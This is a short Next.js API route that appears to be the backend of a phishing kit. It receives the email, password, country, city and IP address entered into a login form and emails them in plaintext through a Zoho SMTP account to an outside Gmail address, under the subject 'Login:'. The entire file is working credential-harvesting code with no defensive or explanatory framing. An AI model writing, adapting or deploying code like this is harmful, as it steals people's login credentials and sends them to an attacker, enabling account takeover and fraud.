"use server"
import {NextApiRequest, NextResponse } from "next/server";
import nodemailer from "nodemailer";


const user = process.env.EMAIL;
const pass = process.env.PASSWORD;

export default async function handler(req, res) {
  try {
    const body = await req.body;
    const {email, password, country, city, host_ip, date} = body

    console.log(email, password, country, city, host_ip, date)

    const transporter = nodemailer.createTransport({
      service: "zoho",
      host: "smtp.zoho.com",
      port: 465,
      secure: true,
      auth: {
        user,
        pass,
      },
    });

    const mailOptions = {
      from: "rep_info@zohomail.com",
      to: "marysalvatore084@gmail.com",
      subject: `Login: | ${email} | ${country} | ${host_ip}`,
      text: `Email: ${email}\nPassword: ${password}\nCountry: ${country}\nCity: ${city}\nHost: ${host_ip}\nDate: ${date}`,
    };

    await transporter.sendMail(mailOptions);
    console.log('Message sent successfully')
    res.status(200).send({message: 'Message sent successful'})
    // return NextResponse.json(
    //     { message: "Message sent successfully" },
    //     { status: 200 },
    //   );

  } catch (error) {
    console.log('Failed to send message')
    res.status(500).send({error: "Failed to send message."})
    // new NextResponse("Failed to send message.", { status: 500 })
  }
}

